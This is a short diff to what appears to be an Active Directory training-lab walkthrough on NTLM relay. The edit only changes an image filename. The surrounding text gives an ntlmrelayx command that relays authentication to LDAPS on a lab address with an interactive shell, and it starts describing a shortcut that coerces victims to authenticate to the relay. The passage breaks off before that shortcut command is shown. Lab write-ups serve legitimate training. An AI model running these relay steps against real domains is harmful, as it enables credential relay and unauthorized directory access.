@@ -47,7 +47,7 @@ Run the following command in Ubuntu to execute ntlmrelayx. Keep in mind the foll
 ```batch
 sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.x --http-port '80,8080' -i --no-smb-server
 ```
-<figure><img src="../assets/gpo-abuse-2.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../assets/ntlm-relay-1.png" alt=""><figcaption></figcaption></figure>
 
 On the student VM, let's create a Shortcut that connects to the ntlmrelayx listener. Go to **C:\AD\Tools -> Right Click -> New -> Shortcut**. Copy the following command in the Shortcut location:
 
